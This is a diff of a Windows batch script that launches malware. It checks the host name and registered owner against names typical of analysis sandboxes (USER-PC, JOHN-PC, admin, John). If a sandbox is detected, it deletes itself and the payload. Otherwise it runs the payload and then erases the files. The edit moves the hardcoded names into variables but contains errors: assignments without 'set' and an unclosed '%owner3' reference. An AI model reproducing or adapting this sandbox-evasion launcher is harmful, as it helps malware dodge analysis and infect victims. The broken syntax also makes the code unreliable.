@@ -1,4 +1,9 @@
 @echo off
+owner1="Registered Owner:                 admin"
+owner2="Registered Owner:                 Windows User"
+owner3="Registered Owner:                 John"
+host1="Host Name:                 USER-PC"
+host2="Host Name:                 JOHN-PC"
 
 REM # Authered by b1krb7
 REM -----------------------------------------------------------------------------------
@@ -54,11 +59,11 @@ REM -------------------------------
 REM # Checks the associated Host Name
 REM -------------------------------
       
-		  if "%name%"=="Host Name:                 USER-PC" (
+		  if "%name%"=="%host1%" (
 			        del PAYLOAD.zip.exe
               			del checkV.bat
 		  ) else (
-			        if "%name%"=="Host Name:                 JOHN-PC" (
+			        if "%name%"=="%host2%" (
 				            del PAYLOAD.zip.exe
                     			    del checkV.bat
 			        ) else (
@@ -72,21 +77,21 @@ REM -------------------------------
 REM # Checks the registered Owner
 REM -------------------------------     
       
-		  if "%own%"=="Registered Owner:          admin" (
+		  if "%own%"=="%owner1%" (
 			      del PAYLOAD.zip.exe
             		      del checkV.bat
 		  ) else (
-			      if "%own%"=="Registered Owner:                 Windows User" (
+			      if "%own%"=="%owner2%" (
 			              del PAYLOAD.zip.exe
                     		      del checkV.bat
 			      ) else (
-				            if "%own%"=="Registered Owner:                 John" (
+				            if "%own%"=="%owner3" (
 					                 del PAYLOAD.zip.exe
                            				 del checkV.bat
 				    ) else (
-					          start PAYLOAD.zip.exe
+					          start PAYLOADTOEXECUTE
                     				  timeout 2
-                    				  del PAYLOAD.zip.exe
+                    				  del PAYLOADTOEXECUTE
                     				  del checkV.bat
 		        )))
 	    )
